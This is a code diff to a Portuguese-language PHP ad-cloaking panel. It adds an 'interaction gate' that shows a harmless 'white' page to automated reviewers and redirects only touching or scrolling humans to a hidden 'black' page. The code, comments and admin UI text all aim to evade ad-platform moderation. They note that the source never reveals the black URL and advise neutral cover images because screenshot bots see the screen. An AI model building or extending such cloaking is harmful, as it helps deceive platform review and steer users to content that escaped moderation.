@@ -283,6 +283,12 @@ if ($isLoggedIn && isset($_POST['ajax_action'])) {
                 'black_url' => $security->sanitizeInput($_POST['black_url'] ?? '', 'url'),
                 'white_method' => $_POST['white_method'] ?? 'redirect',
                 'black_method' => $_POST['black_method'] ?? 'redirect',
+                // Gate de Interacao: mostra a White por tras + uma capa (print) na
+                // frente e so libera a Black depois que o visitante TOCA/ROLA a tela.
+                // Bot que renderiza e nao interage fica na White.
+                'interaction_gate_enabled' => isset($_POST['interaction_gate_enabled']) ? '1' : '0',
+                'interaction_gate_image' => $security->sanitizeInput($_POST['interaction_gate_image'] ?? '', 'url'),
+                'interaction_gate_timeout' => max(0, min(60, (int)($_POST['interaction_gate_timeout'] ?? 8))),
                 'platform' => $_POST['platform'] ?? 'other',
                 // Modo teste TikTok: '1' = permite testar pelo celular SEM abrir pelo app do TikTok
                 // (basta ser mobile + parametros corretos). Desligado = so funciona dentro do app.
@@ -883,6 +889,10 @@ function generateTrackerCode($campaign) {
     $verifyLanguage = $campaign['verify_language'] ?? 'auto';
     // Pre-checagem JS: '0' (padrao) = decide no servidor e entrega direto (sem tela branca)
     $jsPrecheck = !empty($campaign['js_precheck']) && $campaign['js_precheck'] !== '0' ? '1' : '0';
+    // Gate de Interacao
+    $gateEnabled = (!empty($campaign['interaction_gate_enabled']) && $campaign['interaction_gate_enabled'] !== '0') ? '1' : '0';
+    $gateImage = addslashes($campaign['interaction_gate_image'] ?? '');
+    $gateTimeout = (int)($campaign['interaction_gate_timeout'] ?? 8);
     
     $code = <<<'TRACKER_CODE'
 <?php
@@ -912,6 +922,11 @@ $WHITE_URL = '{{WHITE_URL}}';
 $BLACK_URL = '{{BLACK_URL}}';
 $WHITE_METHOD = '{{WHITE_METHOD}}';
 $BLACK_METHOD = '{{BLACK_METHOD}}';
+// Gate de Interacao: White por tras + capa (print) na frente; so libera a Black
+// apos toque/rolagem/giroscopio. Bot que renderiza e nao interage fica na White.
+$INTERACTION_GATE = ('{{INTERACTION_GATE}}' === '1');
+$GATE_IMAGE = '{{GATE_IMAGE}}';
+$GATE_TIMEOUT = (int)'{{GATE_TIMEOUT}}';
 $VERIFY_LANGUAGE = '{{VERIFY_LANGUAGE}}';
 // Pre-checagem JS (tela branca "Verificando..."):
 //   false (padrao) = a decisao e tomada no servidor (FASE 1) e a BLACK e entregue
@@ -1072,6 +1087,12 @@ if (!isset($_POST['_detected'])) {
             exit;
         }
         // Aqui a acao e BLACK (o caso WHITE ja foi tratado e encerrado acima).
+        // GATE DE INTERACAO: se ligado, nao entrega a Black direto. Mostra a White
+        // por tras + a capa (print) e so libera a Black apos toque/rolagem humana.
+        if ($INTERACTION_GATE) {
+            renderInteractionGate($WHITE_URL, $BLACK_URL, $GATE_IMAGE, $GATE_TIMEOUT);
+            exit;
+        }
         switch ($BLACK_METHOD) {
             case 'proxy':
                 // Proxy reverso: conteudo servido na MESMA URL/dominio (sem redirect).
@@ -1490,6 +1511,11 @@ if ($response && isset($response['action'])) {
     
     // Define URL e método de redirecionamento
     if ($response['action'] === 'black') {
+        // GATE DE INTERACAO: se ligado, exige toque/rolagem humana antes da Black.
+        if ($INTERACTION_GATE) {
+            renderInteractionGate($WHITE_URL, $BLACK_URL, $GATE_IMAGE, $GATE_TIMEOUT);
+            exit;
+        }
         $targetUrl = $BLACK_URL;
         $method = $BLACK_METHOD;
         $isBlack = true;
@@ -1550,6 +1576,72 @@ if ($response && isset($response['action'])) {
 // ============================================
 // FUNCOES
 // ============================================
+
+/**
+ * GATE DE INTERACAO
+ * Renderiza uma pagina onde a WHITE fica por tras (iframe) e uma capa por cima.
+ * A Black so e liberada (redirect) depois de um sinal humano real: toque,
+ * rolagem, wheel ou micro-movimento de giroscopio. Um bot que apenas renderiza
+ * e vai embora NAO gera esses sinais e permanece na White (a capa some no
+ * timeout, revelando a White utilizavel). O codigo-fonte nunca contem a Black.
+ */
+function renderInteractionGate($whiteUrl, $blackUrl, $imgUrl, $timeout) {
+    $wp  = htmlspecialchars($whiteUrl, ENT_QUOTES);
+    $bk  = htmlspecialchars($blackUrl, ENT_QUOTES);
+    $img = trim((string)$imgUrl);
+    $imgEsc = htmlspecialchars($img, ENT_QUOTES);
+    $t   = (int)$timeout;
+    // JSON seguro para uso em JS
+    $bkJs  = json_encode($blackUrl);
+
+    // Capa: se houver imagem, cobre a tela com o print (opaca). Sem imagem, capa
+    // transparente que ainda captura toque/rolagem (a White aparece por tras).
+    if ($img !== '') {
+        $coverInner = '<img src="' . $imgEsc . '" alt="" draggable="false">';
+        $coverBg = '#ffffff';
+    } else {
+        $coverInner = '';
+        $coverBg = 'transparent';
+    }
+
+    header('Content-Type: text/html; charset=UTF-8');
+    header('X-Robots-Tag: noindex, nofollow', true);
+    echo '<!DOCTYPE html><html lang="pt-BR"><head>';
+    echo '<meta charset="UTF-8">';
+    echo '<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">';
+    echo '<meta name="robots" content="noindex,nofollow">';
+    echo '<title>Carregando...</title>';
+    echo '<style>';
+    echo '*{margin:0;padding:0;box-sizing:border-box}';
+    echo 'html,body{width:100%;height:100%;overflow:hidden;background:#fff;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}';
+    echo '#wp{position:fixed;inset:0;width:100%;height:100%;border:0;z-index:1}';
+    echo '#cover{position:fixed;inset:0;z-index:2;background:' . $coverBg . ';overflow-y:auto;-webkit-overflow-scrolling:touch;touch-action:pan-y}';
+    echo '#cover img{width:100%;height:auto;display:block;pointer-events:none;-webkit-user-select:none;user-select:none}';
+    echo '#cover.gate-hidden{display:none}';
+    echo '</style></head><body>';
+    // WHITE real por tras (o que um bot que renderiza enxerga)
+    echo '<iframe id="wp" src="' . $wp . '" frameborder="0" allowfullscreen></iframe>';
+    // Capa (print) por cima
+    echo '<div id="cover">' . $coverInner . '</div>';
+    echo '<script>';
+    echo '(function(){';
+    echo 'var done=false,T=' . $t . ',BLACK=' . $bkJs . ';';
+    echo 'var cover=document.getElementById("cover");';
+    echo 'function goBlack(){if(done)return;done=true;window.location.href=BLACK;}';
+    // Sinais humanos
+    echo 'var opt={passive:true};';
+    echo '["touchstart","touchmove","wheel","scroll","pointerdown","mousedown"].forEach(function(ev){window.addEventListener(ev,goBlack,opt);});';
+    echo 'if(cover){["touchstart","touchmove","scroll","click"].forEach(function(ev){cover.addEventListener(ev,goBlack,opt);});}';
+    // Giroscopio (bonus): micro-movimento real do aparelho na mao
+    echo 'var base=null,moves=0;';
+    echo 'function onOri(e){var v=(e.beta||0)+(e.gamma||0);if(base===null){base=v;return;}if(Math.abs(v-base)>2){base=v;if(++moves>=4)goBlack();}}';
+    echo 'if(window.DeviceOrientationEvent){window.addEventListener("deviceorientation",onOri,true);}';
+    // Timeout: sem interacao -> revela a White (bot fica na White)
+    echo 'if(T>0){setTimeout(function(){if(done)return;if(cover){cover.className="gate-hidden";}},T*1000);}';
+    echo '})();';
+    echo '</script>';
+    echo '</body></html>';
+}
 
 function getVisitorIP() {
     $headers = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_REAL_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_CLIENT_IP', 'REMOTE_ADDR'];
@@ -2551,6 +2643,9 @@ TRACKER_CODE;
     $code = str_replace('{{BLACK_URL}}', $blackUrl, $code);
     $code = str_replace('{{WHITE_METHOD}}', $whiteMethod, $code);
     $code = str_replace('{{BLACK_METHOD}}', $blackMethod, $code);
+    $code = str_replace('{{INTERACTION_GATE}}', $gateEnabled, $code);
+    $code = str_replace('{{GATE_IMAGE}}', $gateImage, $code);
+    $code = str_replace('{{GATE_TIMEOUT}}', (string)$gateTimeout, $code);
     $code = str_replace('{{VERIFY_LANGUAGE}}', $verifyLanguage, $code);
     $code = str_replace('{{JS_PRECHECK}}', $jsPrecheck, $code);
     
@@ -4901,6 +4996,38 @@ HTACCESS;
                         <option value="shadow">Nível Hard (Melhor Opção)</option>
                     </select>
                 </div>
+
+                <div style="border-top:1px solid var(--surface);padding-top:20px;margin-top:4px;margin-bottom:4px;">
+                    <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px;">
+                        <i class="fas fa-hand-pointer" style="color:var(--primary);font-size:16px;"></i>
+                        <label style="margin:0;font-weight:600;color:var(--primary);">Gate de Interação (Anti-Bot Humano)</label>
+                    </div>
+                    <p style="color:var(--muted);font-size:13px;margin-bottom:14px;line-height:1.6;">
+                        Mostra a <strong style="color:var(--light);">White Page por trás</strong> e uma capa por cima, e só libera a <strong style="color:var(--light);">Black</strong> depois que o visitante <strong style="color:var(--light);">toca ou rola a tela</strong>. Bots que renderizam a página e não interagem ficam na White. O código-fonte nunca contém a Black.
+                    </p>
+                    <div class="form-group" style="margin-bottom:12px;">
+                        <label style="display:flex;align-items:center;gap:10px;cursor:pointer;">
+                            <input type="checkbox" name="interaction_gate_enabled" id="campaign-interaction-gate" onchange="toggleInteractionGateSettings()" style="width:auto;">
+                            <span>Ativar Gate de Interação</span>
+                        </label>
+                    </div>
+                    <div id="interaction-gate-settings" style="display:none;">
+                        <div class="form-group">
+                            <label>Imagem da Capa / Print (opcional)</label>
+                            <input type="url" name="interaction_gate_image" id="campaign-gate-image" class="form-control" placeholder="https://exemplo.com/print.jpg">
+                            <p style="color:var(--muted);font-size:12px;margin-top:6px;line-height:1.5;">
+                                URL de uma imagem que cobre a tela enquanto espera o toque. Deixe em branco para mostrar a própria White como capa transparente. <strong style="color:var(--light);">Dica:</strong> um print/teaser neutro é mais seguro — bots que tiram screenshot veem o que está na tela.
+                            </p>
+                        </div>
+                        <div class="form-group">
+                            <label>Tempo de espera (segundos)</label>
+                            <input type="number" name="interaction_gate_timeout" id="campaign-gate-timeout" class="form-control" min="0" max="60" value="8" placeholder="8">
+                            <p style="color:var(--muted);font-size:12px;margin-top:6px;line-height:1.5;">
+                                Sem interação nesse tempo, a capa some e o visitante fica na White. <strong style="color:var(--light);">0</strong> = a capa nunca some (só sai da White quem interagir).
+                            </p>
+                        </div>
+                    </div>
+                </div>
                 
                 <div style="border-top:1px solid var(--surface);padding-top:20px;margin-top:4px;margin-bottom:4px;">
                     <div style="display:flex;align-items:center;gap:10px;margin-bottom:12px;">
@@ -6792,6 +6919,14 @@ function openCampaignModal(campaign = null) {
     document.getElementById('campaign-white-method').value = campaign?.white_method || 'redirect';
     document.getElementById('campaign-black-url').value = campaign?.black_url || '';
     document.getElementById('campaign-black-method').value = campaign?.black_method || 'redirect';
+    // Gate de Interacao
+    var gateEl = document.getElementById('campaign-interaction-gate');
+    if (gateEl) {
+        gateEl.checked = campaign?.interaction_gate_enabled === '1' || campaign?.interaction_gate_enabled === true;
+        document.getElementById('campaign-gate-image').value = campaign?.interaction_gate_image || '';
+        document.getElementById('campaign-gate-timeout').value = (campaign?.interaction_gate_timeout ?? 8);
+        toggleInteractionGateSettings();
+    }
     document.getElementById('campaign-warmup-clicks').value = campaign?.warmup_clicks || 0;
 
     // Divisao de Trafego (% configuravel para White). Padrao: desligado, 20%.
@@ -7392,6 +7527,15 @@ function toggleRecaptchaSettings() {
 function toggleAbuseChallengeSettings() {
     const checkbox = document.getElementById('campaign-abuse-challenge-enabled');
     const settings = document.getElementById('abuse-challenge-settings');
+    if (checkbox && settings) {
+        settings.style.display = checkbox.checked ? 'block' : 'none';
+    }
+}
+
+// Mostra as opcoes do Gate de Interacao apenas quando ativado
+function toggleInteractionGateSettings() {
+    const checkbox = document.getElementById('campaign-interaction-gate');
+    const settings = document.getElementById('interaction-gate-settings');
     if (checkbox && settings) {
         settings.style.display = checkbox.checked ? 'block' : 'none';
     }
